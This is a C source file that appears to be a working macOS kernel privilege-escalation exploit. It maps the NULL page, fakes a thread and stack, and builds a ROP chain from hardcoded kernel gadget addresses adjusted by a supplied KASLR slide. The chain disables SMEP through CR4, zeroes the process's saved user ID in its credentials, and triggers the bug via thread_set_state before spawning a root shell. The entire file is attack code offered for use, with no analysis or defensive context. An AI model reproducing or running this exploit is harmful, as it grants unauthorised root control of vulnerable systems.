#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>
#include "definitions.h"
#include <signal.h>
#define KERNEL_BASE_NO_SLID 0xFFFFFF8000100000ULL
long usr_ebp;
void aftermath(){
	setuid(0);
	setuid(0);
	printf("getuid(): %d\n",getuid());
	system("/bin/sh");
	exit(0);	
}
int main(int argc, const char * argv[]) {
	uint64_t slide = strtol(argv[1],NULL,16);
	printf("[+] PID:%d\n",getpid());
	printf("[+] KASLR slide: %p\n",slide);
	puts("[?] Go pro?");
	scanf("%*c");
	vm_address_t addr = 0;
	assert(vm_allocate(mach_task_self(),&addr,0x1000,0)==0);
	memset(0,0,0x1000);
	x86_saved_state32_t state;
	mach_msg_type_number_t stateCount = x86_THREAD_STATE32_COUNT;
	//puts("Continue?");
	//scanf("%*c");
	//fflush(stdout);
	memset(&state, 0xFF, sizeof(x86_saved_state32_t));
	state.gs = 0x23;
	vm_address_t fakeThread = 0;
	assert(vm_allocate(mach_task_self(),&fakeThread,0x1000,VM_FLAGS_ANYWHERE)==0);
	printf("[+] Fake Thread address: %p\n",fakeThread);
	vm_address_t fakeStack = 0;
	assert(vm_allocate(mach_task_self(),&fakeStack,0x10000,VM_FLAGS_ANYWHERE)==0);
	printf("[+] Fake stack address: %p\n",fakeStack);
	*(int64_t*)(8) = fakeThread;
	*(int64_t*)(fakeThread+848) = 0xffffff8000228061+slide;//thread->recover (leave;ret;)
	*(int64_t*)(0+0x168) = 0x500;//rsp (CPU_ESTACK)
	state.ebp = fakeStack+0x500;
	int64_t* fs = fakeStack+0x500;
	*(fs++) = 0xdeadbeef;
	*(fs++) = 0xffffff8000229270+slide; //pop rax; ret;
	*(fs++) = 0x00000000000606e0; //SMEP bit off
	*(fs++) = 0xffffff800040b613+slide; //mov cr4, rax; ret;
	*(fs++) = swapgs;
	*(fs++) = 0xffffff8000968360+slide; //current_proc

	*(fs++) = 0xffffff80007ce67a+slide; //pop rcx; ret;
	*(fs++) = 0xffffff8000820d30+slide; //proc_ucred
	*(fs++) = 0xffffff800098b4b6+slide; //mov rdi, rax; pop rbp; jmp rcx;
	*(fs++) = 0xdeadbeef;
	*(fs++) = 0xffffff80007ce67a+slide; //pop rcx; ret;
	*(fs++) = 0xffffff80007ddbe0+slide; //posix_cred_get
	*(fs++) = 0xffffff800098b4b6+slide; //mov rdi, rax; pop rbp; jmp rcx;
	*(fs++) = 0xdeadbeef;
	
	*(fs++) = 0xffffff8000a28a5d + slide;// mov qword ptr [rax + 8], 0; pop rbp; ret; update cr_svuid
	asm("mov %%ebp, %0;":"=r"(*(fs++)));
	
	*(fs++) = (int64_t)prepIretq; 
	*(fs++) = 0xffffff80002298bc+slide;//ret32_iret we can't use thread_exception_return because the saved_state is f'ked up

	*(fs++) = aftermath;
	*(fs++) = 0x1b;
	*(fs++) = 0x246;
	asm("mov %%esp, %0;":"=r"(*(fs++)));
	*(fs++) = 0x23;
	fflush(stdout);
	signal(SIGSEGV,aftermath);
	printf("%d\n",thread_set_state(mach_thread_self(), x86_SAVED_STATE32, (thread_state_t) &state, x86_SAVED_STATE32_COUNT));
	while(1) {}
	return 0;
}





